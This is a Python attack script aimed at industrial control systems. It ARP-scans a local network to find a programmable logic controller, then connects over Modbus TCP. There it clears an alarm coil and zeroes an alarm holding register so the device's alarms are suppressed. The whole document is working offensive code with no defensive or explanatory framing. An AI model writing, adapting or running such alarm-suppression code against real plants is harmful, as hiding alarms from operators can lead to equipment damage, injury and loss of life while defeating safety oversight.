import sys
import time
import struct
from scapy.all import ARP, Ether, srp
from pymodbus.client import ModbusTcpClient

# Step 1: Discover the PLC's IP on the network
def discover_plc_ip(target_network="192.168.1.0/24"):
    print("[*] Scanning the network for PLC...")
    arp_request = ARP(pdst=target_network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    # Assuming the PLC has a known vendor MAC prefix or specific IP range
    for sent, received in answered_list:
        print(f"[*] Found device at {received.psrc} - MAC: {received.hwsrc}")
        if received.psrc.startswith("192.168.1.10"):  # Adjust based on known IP range
            print(f"[+] PLC Identified at {received.psrc}")
            return received.psrc
    print("[-] No PLC found.")
    return None

# Step 2: Suppress alarms by modifying Modbus coil/register
def suppress_alarms(plc_ip):
    if not plc_ip:
        print("[-] No PLC detected. Exiting...")
        return

    print(f"[*] Connecting to PLC at {plc_ip} to suppress alarms...")
    client = ModbusTcpClient(plc_ip)

    if client.connect():
        # Assume alarm bits are in Modbus coil 0x0001 or holding register 40001
        alarm_coil_address = 1  # Example coil for alarm in PLC
        alarm_register_address = 40001  # Example register

        # Read initial alarm state
        response = client.read_coils(alarm_coil_address, 1)
        if response and response.bits[0]:
            print(f"[!] Alarm detected. Suppressing it...")
            client.write_coil(alarm_coil_address, False)  # Disable the alarm
        
        # Another approach: Overwrite registers responsible for alarms
        response = client.read_holding_registers(alarm_register_address, 1)
        if response and response.registers:
            print(f"[!] Alarm flag detected in register {alarm_register_address}. Modifying it...")
            client.write_register(alarm_register_address, 0)  # Override alarm value
        
        print("[+] Alarm suppression successful.")
        client.close()
    else:
        print("[-] Failed to connect to PLC.")

# Main logic
if __name__ == "__main__":
    plc_ip = discover_plc_ip()
    suppress_alarms(plc_ip)